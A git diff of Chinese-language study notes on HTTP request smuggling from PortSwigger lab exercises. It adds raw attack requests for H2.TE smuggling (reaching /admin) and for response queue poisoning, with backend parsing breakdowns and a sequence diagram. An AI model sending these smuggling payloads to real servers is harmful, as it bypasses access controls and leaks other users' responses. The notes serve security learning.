@@ -28,6 +28,8 @@ If a message is received with both a Transfer-Encoding and a Content-Length head
 | Document  | https://portswigger.net/web-security/request-smuggling#cl-te-vulnerabilities |
 | Lab       | https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te       |
 
+### 2 complete request
+
 我原本想用 NodeJS http 模組來寫 exploit，結果發現要用比較底層的 Socket 才能構造 HTTP Raw Request，第一次成功是用以下 exploit，但只能看到第一個 Response
 
 ```ts
@@ -69,6 +71,8 @@ function lab1() {
 
 lab1();
 ```
+
+### portSwigger solution
 
 後來模仿答案的 PoC，修改了我的程式碼，第一次的結尾多傳一個 `G`，第二次則是構造完整的 POST 請求，合併起來就是 GPOST
 
@@ -118,6 +122,8 @@ function sendRequest(round: 1 | 2) {
 
 lab1();
 ```
+
+### my solution
 
 經過一番思考，終於理解為何
 
@@ -1573,13 +1579,121 @@ csrf=ECSu5Ujtr8gPzpFEWZZKSpsCTunj6M5o&postId=1&name=victim4&email=victim4%40emai
 
 https://portswigger.net/web-security/request-smuggling/advanced#h2-te-vulnerabilities
 
-<!-- todo-yus -->
+成因：
+
+1. http/2 server 允許 `transfer-encoding: chunked`
+2. 後續 downgrade 到 http/1.1
+3. 該 http/1.1 server 支援 `transfer-encoding: chunked`
+
+Attack Request
+
+```
+:method: POST
+:path: /example
+:authority: vulnerable-website.com
+transfer-encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Start-Line:
+```
+
+Backend Server
+
+```
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+
+```
+
+Backend Server unprocessed
+
+```
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Start-Line:
+```
 
 ## Response queue poisoning
 
 https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning
 
-<!-- todo-yus -->
+看了這篇的介紹，我才發現我最一開始的 [PoC](#2-complete-request)，在 Attack Request 構造兩個完整的 Raw HTTP Request，原來有個專有名詞叫做 "Response queue poisoning"
+
+原文
+
+```
+This is achieved by smuggling a complete request, thereby eliciting two responses from the back-end when the front-end server is only expecting one.
+```
+
+Attack Request (Frontend Sever use CL)
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 61
+Transfer-Encoding: chunked
+
+0
+
+GET /anything HTTP/1.1
+Host: vulnerable-website.com
+
+
+```
+
+Backend Server use TE, treat as 2 HTTP Requests
+
+1.
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 61
+Transfer-Encoding: chunked
+
+0
+
+
+```
+
+2.
+
+```
+GET /anything HTTP/1.1
+Host: vulnerable-website.com
+
+
+```
+
+Now the Backend Response queue contains the smuggle request's response
+
+```mermaid
+sequenceDiagram
+  participant Client
+  participant Frontend Server
+
+  Note Over Client, Frontend Server: Attacker
+  Client ->> Frontend Server: Request 1 + Request 2
+  Frontend Server ->> Client: Response 1
+
+  Note Over Client, Frontend Server: Victim
+  Client ->> Frontend Server: Request 3
+  Frontend Server ->> Client: Response 2
+
+  Note Over Client, Frontend Server: Attacker
+  Client ->> Frontend Server: Request 4
+  Frontend Server ->> Client: Response 3
+```
 
 ## 參考資料
 
